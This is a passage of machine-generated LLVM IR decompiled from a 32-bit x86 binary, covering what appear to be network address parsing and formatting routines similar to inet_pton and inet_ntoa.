  %v1_805672b = inttoptr i32 %v0_805672b.pre to i8*
  %v2_805672b = load i8, i8* %v1_805672b, align 1
  %v3_805672b = sext i8 %v2_805672b to i32
  store i32 %v3_805672b, i32* @ecx, align 4
  %v1_805672e = add i32 %v0_805672b.pre, 1
  store i32 %v1_805672e, i32* %ebx.global-to-local, align 4
  %v1_805672f = icmp eq i8 %v2_805672b, 0
  store i1 %v1_805672f, i1* %zf.global-to-local, align 1
  %v1_8056731 = icmp eq i1 %v1_805672f, false
  br i1 %v1_8056731, label %dec_label_pc_80566ee, label %dec_label_pc_805672b.dec_label_pc_8056733_crit_edge

dec_label_pc_805672b.dec_label_pc_8056733_crit_edge: ; preds = %dec_label_pc_805672b.backedge
  %v0_8056733.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056733

dec_label_pc_8056733:                             ; preds = %dec_label_pc_805672b.dec_label_pc_8056733_crit_edge, %dec_label_pc_80566d4
  %v0_8056733 = phi i32 [ %v0_8056733.pre, %dec_label_pc_805672b.dec_label_pc_8056733_crit_edge ], [ 0, %dec_label_pc_80566d4 ]
  %v10_8056733 = icmp eq i32 %v0_8056733, 3
  store i1 %v10_8056733, i1* %zf.global-to-local, align 1
  %v7_8056736 = icmp sgt i32 %v0_8056733, 3
  br i1 %v7_8056736, label %dec_label_pc_8056738, label %dec_label_pc_8056750

dec_label_pc_8056738:                             ; preds = %dec_label_pc_8056733
  %v0_8056738 = load i32, i32* @eax, align 4
  %v3_8056741 = bitcast i32* %stack_var_-20 to i16*
  %v4_8056741 = call i32 @function_8051e5c(i16* %v3_8056741, i32 4, i32 %v0_8056738)
  %v0_805674b = load i32, i32* @esp, align 4
  %v6_805674b = icmp eq i32 %v0_805674b, -16
  store i1 %v6_805674b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8056752

dec_label_pc_8056750:                             ; preds = %dec_label_pc_8056720, %dec_label_pc_805671c, %dec_label_pc_8056717, %dec_label_pc_805670d, %dec_label_pc_80566f6, %dec_label_pc_8056733
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8056752.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056752

dec_label_pc_8056752:                             ; preds = %dec_label_pc_8056738, %dec_label_pc_8056750
  %v0_8056752 = phi i32 [ %v15_80566e0, %dec_label_pc_8056738 ], [ %v0_8056752.pre, %dec_label_pc_8056750 ]
  %v0_8056759 = phi i32 [ 1, %dec_label_pc_8056738 ], [ 0, %dec_label_pc_8056750 ]
  %v9_8056752 = icmp eq i32 %v0_8056752, -28
  store i1 %v9_8056752, i1* %zf.global-to-local, align 1
  %v2_8056755 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056755, i32* @ebx, align 4
  store i32 %v0_80566da, i32* @esi, align 4
  ret i32 %v0_8056759

; uselistorder directives
  uselistorder i32 %v0_8056733, { 1, 0 }
  uselistorder i32 %v3_805672b, { 1, 0 }
  uselistorder i8 %v2_805672b, { 1, 2, 0 }
  uselistorder i1 %v9_8056720, { 1, 0 }
  uselistorder i32 %v1_805670e, { 1, 0 }
  uselistorder i32 %v3_80566fc, { 1, 2, 0, 3 }
  uselistorder i8 %v2_805672b22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8056752, { 1, 0 }
  uselistorder label %dec_label_pc_8056750, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_80566ee, { 1, 0 }
}

define i32 @function_805675a(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805675a:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805675a = load i32, i32* @ebp, align 4
  %v0_805675b = load i32, i32* @edi, align 4
  %v0_805675c = load i32, i32* @esi, align 4
  %v0_805675d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8056765 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8056765, i32* @edi, align 4
  %v9_8056769 = icmp eq i32 %arg1, 2
  br i1 %v9_8056769, label %dec_label_pc_8056779, label %dec_label_pc_805676e

dec_label_pc_805676e:                             ; preds = %dec_label_pc_805675a
  %v9_805676e = icmp eq i32 %arg1, 10
  %v1_8056771 = icmp eq i1 %v9_805676e, false
  br i1 %v1_8056771, label %dec_label_pc_805690a, label %dec_label_pc_8056789

dec_label_pc_8056779:                             ; preds = %dec_label_pc_805675a
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8056765, i32* @eax, align 4
  %v3_805677f = call i32 @function_80566d4(i32 %v0_805675d, i32 %v0_805675c, i32 %v0_805675b)
  store i32 %v3_805677f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805691c

dec_label_pc_8056789:                             ; preds = %dec_label_pc_805676e
  %v2_805678e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805678e, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_8056793 = call i32 @function_8051e84(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_8056793, i32* @ebx, align 4
  %v2_805679a = add i32 %v5_8056793, 16
  store i32 %v2_805679a, i32* %eax.global-to-local, align 4
  %v0_80567a4 = load i32, i32* @edi, align 4
  %v1_80567a4 = inttoptr i32 %v0_80567a4 to i8*
  %v2_80567a4 = load i8, i8* %v1_80567a4, align 1
  %v11_80567a4 = icmp eq i8 %v2_80567a4, 58
  %v1_80567a7 = icmp eq i1 %v11_80567a4, false
  br i1 %v1_80567a7, label %dec_label_pc_805683a, label %dec_label_pc_80567a9

dec_label_pc_80567a9:                             ; preds = %dec_label_pc_8056789
  %v1_80567a9 = add i32 %v0_80567a4, 1
  store i32 %v1_80567a9, i32* @edi, align 4
  %v1_80567aa = inttoptr i32 %v1_80567a9 to i8*
  %v2_80567aa = load i8, i8* %v1_80567aa, align 1
  %v11_80567aa = icmp eq i8 %v2_80567aa, 58
  %v1_80567ad = icmp eq i1 %v11_80567aa, false
  br i1 %v1_80567ad, label %dec_label_pc_805691a, label %dec_label_pc_805683a

dec_label_pc_80567c1:                             ; preds = %dec_label_pc_805687a
  %v0_80567c2 = load i32, i32* @edi, align 4
  %v1_80567c2 = add i32 %v0_80567c2, 1
  store i32 %v1_80567c2, i32* @edi, align 4
  %v4_80567ca = call i32 @function_8051ebc(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805d434.416, i32 0, i32 0), i32 %v2_8056881)
  store i32 %v4_80567ca, i32* %eax.global-to-local, align 4
  %v1_80567d2 = icmp eq i32 %v4_80567ca, 0
  br i1 %v1_80567d2, label %dec_label_pc_80567f1, label %dec_label_pc_80567d6

dec_label_pc_80567d6:                             ; preds = %dec_label_pc_80567c1
  %v0_80567d6 = load i32, i32* @ebp, align 4
  %v2_80567d6 = mul i32 %v0_80567d6, 16
  %v1_80567d9 = add i32 %v4_80567ca, -134599732
  store i32 %v1_80567d9, i32* %eax.global-to-local, align 4
  %v2_80567de = or i32 %v2_80567d6, %v1_80567d9
  store i32 %v2_80567de, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_80567de, 65536
  br i1 %tmp, label %dec_label_pc_80567d6.dec_label_pc_805687a.outer_crit_edge, label %dec_label_pc_805691a

dec_label_pc_80567d6.dec_label_pc_805687a.outer_crit_edge: ; preds = %dec_label_pc_80567d6
  %v0_805687a.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805687a.outer

dec_label_pc_805687a.outer:                       ; preds = %dec_label_pc_80567d6.dec_label_pc_805687a.outer_crit_edge, %dec_label_pc_805683a
  %v0_805687a.pre = phi i32 [ %v0_805687a.pre.pre, %dec_label_pc_80567d6.dec_label_pc_805687a.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_805683a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_80567d6.dec_label_pc_805687a.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_805683a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_80567d6.dec_label_pc_805687a.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_805683a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_80567d6.dec_label_pc_805687a.outer_crit_edge ], [ 0, %dec_label_pc_805683a ]
  %v4_80567f6 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_80567fb = icmp eq i1 %v4_80567f6, false
  br label %dec_label_pc_805687a

dec_label_pc_80567f1:                             ; preds = %dec_label_pc_80567c1
  %v0_80567f1 = load i32, i32* @esi, align 4
  %v9_80567f1 = icmp eq i32 %v0_80567f1, 58
  %v1_80567f4 = icmp eq i1 %v9_80567f1, false
  br i1 %v1_80567f4, label %dec_label_pc_8056846, label %dec_label_pc_80567f6

dec_label_pc_80567f6:                             ; preds = %dec_label_pc_80567f1
  br i1 %v1_80567fb, label %dec_label_pc_8056812, label %dec_label_pc_80567fd

dec_label_pc_80567fd:                             ; preds = %dec_label_pc_80567f6
  %v5_80567fd = icmp eq i8* %stack_var_-44.1, null
  %v1_8056802 = icmp eq i1 %v5_80567fd, false
  br i1 %v1_8056802, label %dec_label_pc_805691a, label %dec_label_pc_8056808

dec_label_pc_8056808:                             ; preds = %dec_label_pc_80567fd
  %v0_8056808 = load i32, i32* @ebx, align 4
  %v5_8056808 = inttoptr i32 %v0_8056808 to i8*
  %v0_805680c = load i32, i32* @edi, align 4
  %v5_805680c = inttoptr i32 %v0_805680c to i8*
  br label %dec_label_pc_805687a

dec_label_pc_8056812:                             ; preds = %dec_label_pc_80567f6
  %v0_8056812 = load i32, i32* @edi, align 4
  %v1_8056812 = inttoptr i32 %v0_8056812 to i8*
  %v2_8056812 = load i8, i8* %v1_8056812, align 1
  %v3_8056812 = icmp eq i8 %v2_8056812, 0
  br i1 %v3_8056812, label %dec_label_pc_805691a, label %dec_label_pc_805681b

dec_label_pc_805681b:                             ; preds = %dec_label_pc_8056812
  %v0_805681b = load i32, i32* @ebx, align 4
  %v1_805681b = add i32 %v0_805681b, 2
  store i32 %v1_805681b, i32* @edx, align 4
  %v6_8056822 = icmp ugt i32 %v1_805681b, %v2_805679a
  br i1 %v6_8056822, label %dec_label_pc_805691a, label %dec_label_pc_8056828

dec_label_pc_8056828:                             ; preds = %dec_label_pc_805681b
  %v0_8056828 = load i32, i32* @ebp, align 4
  %v2_805682a = udiv i32 %v0_8056828, 256
  %v4_805682a = trunc i32 %v2_805682a to i8
  %v3_805682d = inttoptr i32 %v0_805681b to i8*
  store i8 %v4_805682a, i8* %v3_805682d, align 1
  %v0_805682f = load i32, i32* @ebp, align 4
  store i32 %v0_805682f, i32* %eax.global-to-local, align 4
  %v1_8056831 = trunc i32 %v0_805682f to i8
  %v2_8056831 = load i32, i32* @ebx, align 4
  %v3_8056831 = add i32 %v2_8056831, 1
  %v4_8056831 = inttoptr i32 %v3_8056831 to i8*
  store i8 %v1_8056831, i8* %v4_8056831, align 1
  %v0_8056834 = load i32, i32* @edx, align 4
  store i32 %v0_8056834, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805683a

dec_label_pc_805683a:                             ; preds = %dec_label_pc_8056789, %dec_label_pc_80567a9, %dec_label_pc_8056828
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8056828 ], [ %v1_80567a9, %dec_label_pc_80567a9 ], [ %v0_80567a4, %dec_label_pc_8056789 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8056828 ], [ null, %dec_label_pc_80567a9 ], [ null, %dec_label_pc_8056789 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805687a.outer

dec_label_pc_8056846:                             ; preds = %dec_label_pc_80567f1
  %v9_8056846 = icmp eq i32 %v0_80567f1, 46
  %v1_8056849 = icmp eq i1 %v9_8056846, false
  br i1 %v1_8056849, label %dec_label_pc_805691a, label %dec_label_pc_805684f

dec_label_pc_805684f:                             ; preds = %dec_label_pc_8056846
  %v0_805684f = load i32, i32* @ebx, align 4
  %v1_805684f = add i32 %v0_805684f, 4
  store i32 %v1_805684f, i32* @esi, align 4
  %v6_8056856 = icmp ugt i32 %v1_805684f, %v2_805679a
  br i1 %v6_8056856, label %dec_label_pc_805691a, label %dec_label_pc_805685c

dec_label_pc_805685c:                             ; preds = %dec_label_pc_805684f
  %v4_805685c = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_805685c, i32* @eax, align 4
  store i32 %v0_805684f, i32* @edx, align 4
  store i32 %v1_805684f, i32* @ebx, align 4
  %v2_8056864 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8056864 = call i32 @function_80566d4(i32 %stack_var_-48.0.ph, i32 %v2_8056864, i32 %v2_805679a)
  store i32 %v5_8056864, i32* %eax.global-to-local, align 4
  %tmp62 = icmp slt i32 %v5_8056864, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_80568b1, label %dec_label_pc_805691a

dec_label_pc_805687a:                             ; preds = %dec_label_pc_805687a.outer, %dec_label_pc_8056808
  %v0_805687a = phi i32 [ %v0_805680c, %dec_label_pc_8056808 ], [ %v0_805687a.pre, %dec_label_pc_805687a.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8056808, %dec_label_pc_8056808 ], [ %stack_var_-44.1.ph, %dec_label_pc_805687a.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_805680c, %dec_label_pc_8056808 ], [ %stack_var_-36.1.ph, %dec_label_pc_805687a.outer ]
  %v1_805687a = inttoptr i32 %v0_805687a to i8*
  %v2_805687a = load i8, i8* %v1_805687a, align 1
  %v3_805687a = sext i8 %v2_805687a to i32
  store i32 %v3_805687a, i32* %eax.global-to-local, align 4
  %v2_8056881 = call i32 @function_8057230(i32 %v3_805687a)
  store i32 %v2_8056881, i32* %eax.global-to-local, align 4
  %v1_8056889 = icmp eq i32 %v2_8056881, 0
  store i32 %v2_8056881, i32* @esi, align 4
  %v1_805688d = icmp eq i1 %v1_8056889, false
  br i1 %v1_805688d, label %dec_label_pc_80567c1, label %dec_label_pc_8056893

dec_label_pc_8056893:                             ; preds = %dec_label_pc_805687a
  br i1 %v4_80567f6, label %dec_label_pc_80568b1, label %dec_label_pc_805689a

dec_label_pc_805689a:                             ; preds = %dec_label_pc_8056893
  %v0_805689a = load i32, i32* @ebx, align 4
  %v1_805689a = add i32 %v0_805689a, 2
  store i32 %v1_805689a, i32* @edx, align 4
  %v6_80568a1 = icmp ugt i32 %v1_805689a, %v2_805679a
  br i1 %v6_80568a1, label %dec_label_pc_805691a, label %dec_label_pc_80568a3

dec_label_pc_80568a3:                             ; preds = %dec_label_pc_805689a
  %v0_80568a3 = load i32, i32* @ebp, align 4
  %v2_80568a5 = udiv i32 %v0_80568a3, 256
  %v4_80568a5 = trunc i32 %v2_80568a5 to i8
  %v3_80568a8 = inttoptr i32 %v0_805689a to i8*
  store i8 %v4_80568a5, i8* %v3_80568a8, align 1
  %v0_80568aa = load i32, i32* @ebp, align 4
  store i32 %v0_80568aa, i32* %eax.global-to-local, align 4
  %v1_80568ac = trunc i32 %v0_80568aa to i8
  %v2_80568ac = load i32, i32* @ebx, align 4
  %v3_80568ac = add i32 %v2_80568ac, 1
  %v4_80568ac = inttoptr i32 %v3_80568ac to i8*
  store i8 %v1_80568ac, i8* %v4_80568ac, align 1
  %v0_80568af = load i32, i32* @edx, align 4
  store i32 %v0_80568af, i32* @ebx, align 4
  br label %dec_label_pc_80568b1

dec_label_pc_80568b1:                             ; preds = %dec_label_pc_8056893, %dec_label_pc_805685c, %dec_label_pc_80568a3
  %v4_80568b1 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80568b1 = icmp eq i8* %stack_var_-44.1, null
  %v0_80568e9.pre = load i32, i32* @ebx, align 4
  br i1 %v5_80568b1, label %dec_label_pc_80568e9, label %dec_label_pc_80568b8

dec_label_pc_80568b8:                             ; preds = %dec_label_pc_80568b1
  store i32 1, i32* @esi, align 4
  %v6_80568bf = sub i32 %v0_80568e9.pre, %v4_80568b1
  store i32 %v6_80568bf, i32* @edi, align 4
  %v16_80568c3 = icmp eq i32 %v0_80568e9.pre, %v2_805679a
  %v1_80568c7 = icmp eq i1 %v16_80568c3, false
  br i1 %v1_80568c7, label %dec_label_pc_80568e1.preheader, label %dec_label_pc_805691a

dec_label_pc_80568e1.preheader:                   ; preds = %dec_label_pc_80568b8
  %v3_80568e189 = inttoptr i32 %v6_80568bf to i8*
  %v9_80568e397 = icmp slt i8* %v3_80568e189, inttoptr (i32 1 to i8*)
  br i1 %v9_80568e397, label %dec_label_pc_80568e5, label %dec_label_pc_80568cb

dec_label_pc_80568cb:                             ; preds = %dec_label_pc_80568e1.preheader, %dec_label_pc_80568cb
  %v0_80568d999 = phi i32 [ %v0_80568e1.pre, %dec_label_pc_80568cb ], [ 1, %dec_label_pc_80568e1.preheader ]
  %v0_80568cb98 = phi i32 [ %v1_80568e1.pre, %dec_label_pc_80568cb ], [ %v6_80568bf, %dec_label_pc_80568e1.preheader ]
  %v2_80568d1 = sub i32 %v0_80568cb98, %v0_80568d999
  %v6_80568d3 = add i32 %v2_80568d1, %v4_80568b1
  store i32 %v6_80568d3, i32* %eax.global-to-local, align 4
  %v2_80568d7 = sub i32 %v2_805679a, %v0_80568d999
  store i32 %v2_80568d7, i32* @ecx, align 4
  %v1_80568d9 = add i32 %v0_80568d999, 1
  store i32 %v1_80568d9, i32* @esi, align 4
  %v1_80568da = inttoptr i32 %v6_80568d3 to i8*
  %v2_80568da = load i8, i8* %v1_80568da, align 1
  %v3_80568da = zext i8 %v2_80568da to i32
  %v4_80568da = load i32, i32* @edx, align 4
  %v5_80568da = and i32 %v4_80568da, -256
  %v6_80568da = or i32 %v5_80568da, %v3_80568da
  store i32 %v6_80568da, i32* @edx, align 4
  %v3_80568dc = inttoptr i32 %v2_80568d7 to i8*
  store i8 %v2_80568da, i8* %v3_80568dc, align 1
  %v0_80568de = load i32, i32* %eax.global-to-local, align 4
  %v1_80568de = inttoptr i32 %v0_80568de to i8*
  store i8 0, i8* %v1_80568de, align 1
  %v0_80568e1.pre = load i32, i32* @esi, align 4
  %v1_80568e1.pre = load i32, i32* @edi, align 4
  %v2_80568e1 = inttoptr i32 %v0_80568e1.pre to i8*
  %v3_80568e1 = inttoptr i32 %v1_80568e1.pre to i8*
  %v9_80568e3 = icmp sgt i8* %v2_80568e1, %v3_80568e1
  br i1 %v9_80568e3, label %dec_label_pc_80568e5, label %dec_label_pc_80568cb

dec_label_pc_80568e5:                             ; preds = %dec_label_pc_80568cb, %dec_label_pc_80568e1.preheader
  br label %dec_label_pc_80568e9

dec_label_pc_80568e9:                             ; preds = %dec_label_pc_80568b1, %dec_label_pc_80568e5
  %v0_80568e9 = phi i32 [ %v2_805679a, %dec_label_pc_80568e5 ], [ %v0_80568e9.pre, %dec_label_pc_80568b1 ]
  %v16_80568e9 = icmp eq i32 %v0_80568e9, %v2_805679a
  %v1_80568ed = icmp eq i1 %v16_80568e9, false
  br i1 %v1_80568ed, label %dec_label_pc_805691a, label %dec_label_pc_80568ef

dec_label_pc_80568ef:                             ; preds = %dec_label_pc_80568e9
  store i32 %v2_805678e, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_80568fb = call i32 @function_8051e5c(i16* %tmp64, i32 %v2_805678e, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805691c

dec_label_pc_805690a:                             ; preds = %dec_label_pc_805676e
  %v1_805690a = call i32 @function_8050f90(i32 %v0_805675d)
  %v1_805690f = inttoptr i32 %v1_805690a to i32*
  store i32 97, i32* %v1_805690f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805691c

dec_label_pc_805691a:                             ; preds = %dec_label_pc_805681b, %dec_label_pc_8056812, %dec_label_pc_80567d6, %dec_label_pc_80567fd, %dec_label_pc_80568b8, %dec_label_pc_805685c, %dec_label_pc_80568e9, %dec_label_pc_805689a, %dec_label_pc_805684f, %dec_label_pc_8056846, %dec_label_pc_80567a9
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805691c

dec_label_pc_805691c:                             ; preds = %dec_label_pc_805690a, %dec_label_pc_80568ef, %dec_label_pc_8056779, %dec_label_pc_805691a
  %v0_8056923 = phi i32 [ -1, %dec_label_pc_805690a ], [ 1, %dec_label_pc_80568ef ], [ %v3_805677f, %dec_label_pc_8056779 ], [ 0, %dec_label_pc_805691a ]
  store i32 %v0_805675d, i32* @ebx, align 4
  store i32 %v0_805675c, i32* @esi, align 4
  store i32 %v0_805675b, i32* @edi, align 4
  store i32 %v0_805675a, i32* @ebp, align 4
  ret i32 %v0_8056923

; uselistorder directives
  uselistorder i32 %v1_80568e1.pre, { 1, 0 }
  uselistorder i32 %v0_80568e1.pre, { 1, 0 }
  uselistorder i32 %v0_80568d999, { 2, 1, 0 }
  uselistorder i32 %v0_80568e9.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8056881, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_805679a, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_805675d, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_80566d4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805691c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805691a, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_80568e9, { 1, 0 }
  uselistorder label %dec_label_pc_80568cb, { 1, 0 }
  uselistorder label %dec_label_pc_80568b1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805687a, { 1, 0 }
  uselistorder label %dec_label_pc_805683a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805687a.outer, { 1, 0 }
}

define i32 @function_8056924(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8056924:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_8056925 = load i32, i32* @edi, align 4
  %v0_8056926 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_805692a = ptrtoint i32* %stack_var_-76 to i32
  %v0_805692d = load i32, i32* @eax, align 4
  %v3_8056931 = and i32 %v0_805692d, -65536
  %v2_8056937 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_805693c = load i32, i32* @edx, align 4
  %v0_8056940 = load i32, i32* @ecx, align 4
  store i32 %v3_8056931, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_805694b = add i32 %v2_8056937, 4
  store i32 %v6_805694b, i32* %edi.global-to-local, align 4
  %v2_805694c = inttoptr i32 %v6_805694b to i32*
  store i32 0, i32* %v2_805694c, align 4
  %v3_805694c = load i32, i32* %edi.global-to-local, align 4
  %v6_805694c = add i32 %v3_805694c, 4
  store i32 %v6_805694c, i32* %edi.global-to-local, align 4
  %v0_805694d = load i32, i32* %eax.global-to-local, align 4
  %v2_805694d = inttoptr i32 %v6_805694c to i32*
  store i32 %v0_805694d, i32* %v2_805694d, align 4
  %v3_805694d = load i32, i32* %edi.global-to-local, align 4
  %v6_805694d = add i32 %v3_805694d, 4
  store i32 %v6_805694d, i32* %edi.global-to-local, align 4
  %v0_805694e = load i32, i32* %eax.global-to-local, align 4
  %v1_805694e = trunc i32 %v0_805694e to i16
  %v3_805694e = inttoptr i32 %v6_805694d to i16*
  store i16 %v1_805694e, i16* %v3_805694e, align 2
  %v4_805694e = load i32, i32* %edi.global-to-local, align 4
  %v7_805694e = add i32 %v4_805694e, 2
  %v0_8056950 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056950 = trunc i32 %v0_8056950 to i8
  %v3_8056950 = inttoptr i32 %v7_805694e to i8*
  store i8 %v1_8056950, i8* %v3_8056950, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_80569eb24 = load i32, i32* @esi, align 4
  %v10_80569eb29 = icmp eq i32 %v0_80569eb24, 3
  store i1 %v10_80569eb29, i1* %zf.global-to-local, align 1
  %v7_80569ee31 = icmp sgt i32 %v0_80569eb24, 3
  br i1 %v7_80569ee31, label %dec_label_pc_80569f4, label %dec_label_pc_8056958

dec_label_pc_8056958:                             ; preds = %dec_label_pc_80569cb, %dec_label_pc_8056924
  %v3_805696e = phi i32 [ 0, %dec_label_pc_8056924 ], [ %v1_80569f4.pre, %dec_label_pc_80569cb ]
  %v0_80569eb32 = phi i32 [ %v0_80569eb24, %dec_label_pc_8056924 ], [ %v0_80569eb, %dec_label_pc_80569cb ]
  %v2_805695e = add i32 %v0_80569eb32, %v0_805692d
  %v12_805695e = icmp eq i32 %v2_805695e, 0
  store i1 %v12_805695e, i1* %zf.global-to-local, align 1
  store i32 %v2_805695e, i32* %ebp.global-to-local, align 4
  %v1_8056960 = inttoptr i32 %v2_805695e to i8*
  %v2_8056960 = load i8, i8* %v1_8056960, align 1
  %v3_8056960 = zext i8 %v2_8056960 to i32
  %v4_8056960 = load i32, i32* @edx, align 4
  %v5_8056960 = and i32 %v4_8056960, -65536
  %v6_8056960 = or i32 %v5_8056960, %v3_8056960
  store i32 %v6_8056960, i32* %edx.global-to-local, align 4
  %div5 = udiv i8 %v2_8056960, 100
  %v6_8056967 = zext i8 %div5 to i32
  %tmp21 = urem i8 %v2_8056960, 100
  %v12_8056967 = zext i8 %tmp21 to i32
  %v14_8056967 = mul nuw nsw i32 %v12_8056967, 256
  %v15_8056967 = or i32 %v6_8056967, %v5_8056960
  %v16_8056967 = or i32 %v15_8056967, %v14_8056967
  store i32 %v16_8056967, i32* %eax.global-to-local, align 4
  %v2_805696b = or i8 %div5, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_805696e = load i32, i32* @esp, align 4
  %v4_805696e = add i32 %v2_805696e, 43
  %v5_805696e = add i32 %v4_805696e, %v3_805696e
  %v6_805696e = inttoptr i32 %v5_805696e to i8*
  store i8 %v2_805696b, i8* %v6_805696e, align 1
  %v0_8056972 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056972 = add i32 %v0_8056972, 1
  store i32 %v0_8056972, i32* @ecx, align 4
  %v0_805697b = load i32, i32* @esp, align 4
  %v2_805697b = add i32 %v0_8056972, 43
  %v3_805697b = add i32 %v2_805697b, %v0_805697b
  %v4_805697b = inttoptr i32 %v3_805697b to i8*
  %v5_805697b = load i8, i8* %v4_805697b, align 1
  %v11_805697b = icmp eq i8 %v5_805697b, 48
  store i1 %v11_805697b, i1* %zf.global-to-local, align 1
  %v1_8056980 = icmp eq i1 %v11_805697b, false
  %v0_80569aa = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8056980, label %dec_label_pc_80569a8, label %dec_label_pc_8056982

dec_label_pc_8056982:                             ; preds = %dec_label_pc_8056958
  %v3_8056986 = trunc i32 %v0_80569aa to i16
  %v5_8056986 = udiv i16 %v3_8056986, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_8056986, 256
  %tmp35 = urem i16 %tmp, 10
  %tmp22 = zext i16 %tmp35 to i32
  store i32 %tmp22, i32* %edx.global-to-local, align 4
  %v1_8056998 = trunc i16 %tmp35 to i8
  %v2_8056998 = or i8 %v1_8056998, 48
  %v12_8056998 = zext i8 %v2_8056998 to i32
  store i32 %v12_8056998, i32* %eax.global-to-local, align 4
  %v7_805699a = icmp eq i8 %v1_8056998, 0
  store i1 %v7_805699a, i1* %zf.global-to-local, align 1
  store i8 %v2_8056998, i8* %v4_805697b, align 1
  %v0_80569a0 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80569a0, label %dec_label_pc_80569cb, label %dec_label_pc_80569a2

dec_label_pc_80569a2:                             ; preds = %dec_label_pc_8056982
  store i32 %v1_8056972, i32* @ecx, align 4
  br label %dec_label_pc_80569cb

dec_label_pc_80569a8:                             ; preds = %dec_label_pc_8056958
  store i32 %v1_8056972, i32* %ebx.global-to-local, align 4
  %v3_80569b0 = trunc i32 %v0_80569aa to i16
  %v5_80569b0 = udiv i16 %v3_80569b0, 10
  %tmp36 = urem i16 %v5_80569b0, 256
  %tmp37 = urem i16 %tmp36, 10
  %tmp23 = zext i16 %tmp37 to i32
  store i32 %tmp23, i32* %edx.global-to-local, align 4
  %v1_80569c0 = add i32 %v0_8056972, 2
